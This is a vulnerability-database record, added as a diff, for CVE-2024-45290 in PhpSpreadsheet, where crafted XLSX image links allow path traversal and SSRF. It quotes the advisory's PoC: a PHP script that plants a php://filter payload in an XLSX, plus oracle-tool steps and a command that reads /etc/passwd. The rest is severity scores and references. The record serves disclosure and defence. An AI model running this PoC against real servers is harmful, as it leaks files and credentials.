@@ -1,0 +1,459 @@
+vulnerability_id: VCID-s76d-xtgn-nkad
+aliases:
+  - CVE-2024-45290
+  - GHSA-5gpr-w2p5-6m37
+summary: |
+  PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery when opening XLSX file
+  ### Summary
+
+  It's possible for an attacker to construct an XLSX file which links media from external URLs. When opening the XLSX file, PhpSpreadsheet retrieves the image size and type by reading the file contents, if the provided path is a URL. By using specially crafted `php://filter` URLs an attacker can leak the contents of any file or URL.
+
+  Note that this vulnerability is different from [GHSA-w9xv-qf98-ccq4](https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4), and resides in a different component.
+
+  ### Details
+
+  When an XLSX file is opened, the XLSX reader calls `setPath()` with the path provided in the `xl/drawings/_rels/drawing1.xml.rels` file in the XLSX archive:
+
+  ```php
+  if (isset($images[$embedImageKey])) {
+      // ...omit irrelevant code...
+  } else {
+      $linkImageKey = (string) self::getArrayItem(
+          $blip->attributes('http://schemas.openxmlformats.org/officeDocument/2006/relationships'),
+          'link'
+      );
+      if (isset($images[$linkImageKey])) {
+          $url = str_replace('xl/drawings/', '', $images[$linkImageKey]);
+          $objDrawing->setPath($url);
+      }
+  }
+  ```
+
+  `setPath()` then reads the file in order to determine the file type and dimensions, if the path is a URL:
+
+  ```php
+  public function setPath(string $path, bool $verifyFile = true, ?ZipArchive $zip = null): static
+  {
+      if ($verifyFile && preg_match('~^data:image/[a-z]+;base64,~', $path) !== 1) {
+          // Check if a URL has been passed. https://stackoverflow.com/a/2058596/1252979
+          if (filter_var($path, FILTER_VALIDATE_URL)) {
+              $this->path = $path;
+              // Implicit that it is a URL, rather store info than running check above on value in other places.
+              $this->isUrl = true;
+              $imageContents = file_get_contents($path);
+              // ... check dimensions etc. ...
+  ```
+
+  It's important to note here, that `filter_var` considers also `file://` and `php://` URLs valid.
+
+  The attacker can set the path to anything:
+
+  ```xml
+  <Relationship Id="rId1"
+      Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
+      Target="this can be whatever" />
+  ```
+
+  The contents of the file are not made available for the attacker directly. However, using PHP filter URLs it's possible to construct an [error oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle) which leaks a file or URL contents one character at a time. The error oracle was originally invented by @hash_kitten, and the folks at Synacktiv have developed a nice tool for easily exploiting those: https://github.com/synacktiv/php_filter_chains_oracle_exploit
+
+  ### PoC
+
+  Target file:
+
+  ```php
+  <?php
+
+  require 'vendor/autoload.php';
+
+  // Attack part: this would actually be done by the attacker on their machine and the resulting XLSX uploaded, but to
+  // keep the PoC simple, I've combined this into the same file.
+
+  $file = "book_tampered.xlsx";
+  $payload = $_POST["payload"]; // the payload comes from the Python script
+
+  copy("book.xlsx",$file);
+  $zip = new ZipArchive;
+  $zip->open($file);
+
+  $path = "xl/drawings/_rels/drawing1.xml.rels";
+  $content = $zip->getFromName($path);
+  $content = str_replace("../media/image1.gif", $payload, $content);
+  $zip->addFromString($path, $content);
+
+  $path = "xl/drawings/drawing1.xml";
+  $content = $zip->getFromName($path);
+  $content = str_replace('r:embed="rId1"', 'r:link="rId1"', $content);
+  $zip->addFromString($path, $content);
+
+  $zip->close();
+
+  // The actual target - note that simply opening the file is sufficient for the attack
+
+  $reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
+  $spreadsheet = $reader->load(__DIR__ . '/' . $file);
+
+  ```
+
+  Add this file in the same directory:
+  [book.xlsx](https://github.com/PHPOffice/PhpSpreadsheet/files/15213296/book.xlsx)
+
+  Serve the PoC from a web server. Ensure your PHP memory limit is <= 128M - otherwise you'll need to edit the Python script below.
+
+  Download the error oracle Python script from here: https://github.com/synacktiv/php_filter_chains_oracle_exploit. If your memory limit is greater than 128M, you'll need to edit the Python script's `bruteforcer.py` file to change `self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)` to `self.blow_up_inf = self.join(*[self.blow_up_utf32]*20)`. This is needed so that it generates large-enough payloads to trigger the out of memory errors the oracle relies on. Also install the script's dependencies with `pip`.
+
+  Then run the Python script with:
+  ```
+  python3 filters_chain_oracle_exploit.py --target [URL of the script] --parameter payload --file /etc/passwd
+  ```
+
+  Note that the attack relies on certain character encodings being supported by the system's `iconv` library, because PHP uses that. As far as I know, most Linux distributions have them, but notably MacOS does not. So if you're developing on a Mac, you'll want to run your server in a virtual machine with Linux.
+
+  Here's the results I got after about a minute of bruteforcing:
+
+  ![image](https://github.com/PHPOffice/PhpSpreadsheet/assets/1294941/06cbaf62-1001-481f-bbcd-d818a61896c4)
+
+  ### Impact
+
+  An attacker can access any file on the server, or leak information form arbitrary URLs, potentially exposing sensitive information such as AWS IAM credentials.
+severities:
+  - score: '0.0008'
+    scoring_system: epss
+    scoring_elements: '0.24733'
+    published_at: '2025-04-27 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.0008'
+    scoring_system: epss
+    scoring_elements: '0.24626'
+    published_at: '2025-04-15 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.0008'
+    scoring_system: epss
+    scoring_elements: '0.24745'
+    published_at: '2025-04-26 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.0008'
+    scoring_system: epss
+    scoring_elements: '0.2476'
+    published_at: '2025-04-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.0008'
+    scoring_system: epss
+    scoring_elements: '0.24741'
+    published_at: '2025-04-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.0008'
+    scoring_system: epss
+    scoring_elements: '0.24729'
+    published_at: '2025-04-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.0008'
+    scoring_system: epss
+    scoring_elements: '0.24725'
+    published_at: '2025-04-22 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.0008'
+    scoring_system: epss
+    scoring_elements: '0.24737'
+    published_at: '2025-04-21 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.0008'
+    scoring_system: epss
+    scoring_elements: '0.24751'
+    published_at: '2025-04-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.0008'
+    scoring_system: epss
+    scoring_elements: '0.24778'
+    published_at: '2025-04-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.0008'
+    scoring_system: epss
+    scoring_elements: '0.24777'
+    published_at: '2025-04-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.0008'
+    scoring_system: epss
+    scoring_elements: '0.24732'
+    published_at: '2025-04-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.0008'
+    scoring_system: epss
+    scoring_elements: '0.24682'
+    published_at: '2025-04-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37503'
+    published_at: '2024-12-11 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.36783'
+    published_at: '2024-11-01 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37061'
+    published_at: '2024-11-18 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37134'
+    published_at: '2024-11-20 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37165'
+    published_at: '2024-11-21 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37259'
+    published_at: '2024-11-23 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37255'
+    published_at: '2024-11-24 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37264'
+    published_at: '2024-11-26 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37283'
+    published_at: '2024-11-28 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37294'
+    published_at: '2024-12-03 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37567'
+    published_at: '2024-12-13 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37646'
+    published_at: '2024-12-15 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37514'
+    published_at: '2024-12-17 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37519'
+    published_at: '2024-12-19 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37477'
+    published_at: '2024-12-27 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00084'
+    scoring_system: epss
+    scoring_elements: '0.37805'
+    published_at: '2025-01-16 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.24012'
+    published_at: '2025-04-12 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.24054'
+    published_at: '2025-04-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.23997'
+    published_at: '2025-04-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.23943'
+    published_at: '2025-03-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.23967'
+    published_at: '2025-04-14 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.2388'
+    published_at: '2025-03-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.24031'
+    published_at: '2025-04-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.24056'
+    published_at: '2025-04-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.24063'
+    published_at: '2025-04-04 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.24069'
+    published_at: '2025-04-05 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.24022'
+    published_at: '2025-04-06 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.23988'
+    published_at: '2025-04-07 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.24004'
+    published_at: '2025-04-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.24032'
+    published_at: '2025-04-09 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.24067'
+    published_at: '2025-04-10 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: '0.00322'
+    scoring_system: epss
+    scoring_elements: '0.3871'
+    published_at: '2025-03-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-5gpr-w2p5-6m37
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet
+  - score: '6.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a
+  - score: '6.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec
+  - score: '6.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465
+  - score: '7.7'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37
+  - score: '6.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4
+  - score: '7.5'
+    scoring_system: cvssv3
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-45290
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-45290
+weaknesses:
+  - CWE-918
+  - CWE-36
+  - CWE-937
+  - CWE-1035
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-45290
+    reference_type:
+    reference_id:
+  - url: https://github.com/PHPOffice/PhpSpreadsheet
+    reference_type:
+    reference_id:
+  - url: https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a
+    reference_type:
+    reference_id:
+  - url: https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec
+    reference_type:
+    reference_id:
+  - url: https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465
+    reference_type:
+    reference_id:
+  - url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37
+    reference_type:
+    reference_id:
+  - url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:phpoffice:phpspreadsheet:*:*:*:*:*:*:*:*
+    reference_type:
+    reference_id: cpe:2.3:a:phpoffice:phpspreadsheet:*:*:*:*:*:*:*:*
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-45290
+    reference_type:
+    reference_id: CVE-2024-45290
+  - url: https://github.com/advisories/GHSA-5gpr-w2p5-6m37
+    reference_type:
+    reference_id: GHSA-5gpr-w2p5-6m37
